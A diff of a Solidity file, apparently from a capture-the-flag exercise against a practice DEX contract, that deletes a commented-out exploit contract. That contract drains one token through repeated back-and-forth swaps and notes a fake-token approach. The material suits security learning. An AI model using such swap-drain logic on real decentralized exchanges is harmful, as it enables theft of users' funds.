@@ -40,54 +40,6 @@ contract HackToken is ERC20 {
     }
 }
 
-// contract Dex2Hack {
-//     /* @remind
-//         1_ Create new erc20
-//         2_ Send 100 tokens to DEX2 contract
-//         3_ Swap token 1 or 2 for the new erc20
-//      */
-
-//     IDex private immutable dex;
-//     IERC20 private immutable token1;
-//     IERC20 private immutable token2;
-
-//     constructor(IDex _dex) {
-//         dex = _dex;
-//         token1 = IERC20(dex.token1());
-//         token2 = IERC20(dex.token2());
-//     }
-
-//     function hackDex() external {
-//         token1.transferFrom(msg.sender, address(this), 10);
-//         token2.transferFrom(msg.sender, address(this), 10);
-
-//         token1.approve(address(dex), type(uint256).max);
-//         token2.approve(address(dex), type(uint256).max);
-
-//         _swap(token1, token2);
-//         _swap(token2, token1);
-//         _swap(token1, token2);
-//         _swap(token2, token1);
-//         _swap(token1, token2);
-
-//         dex.swap(address(token2), address(token1), 45);
-
-//         require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
-//     }
-
-//     function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
-//         dex.swap(
-//             address(tokenIn),
-//             address(tokenOut),
-//             tokenIn.balanceOf(address(this))
-//         );
-//     }
-// }
-
-/*  */
-/*  */
-/*  */
-
 interface IDex {
     function token1() external view returns (address);
 
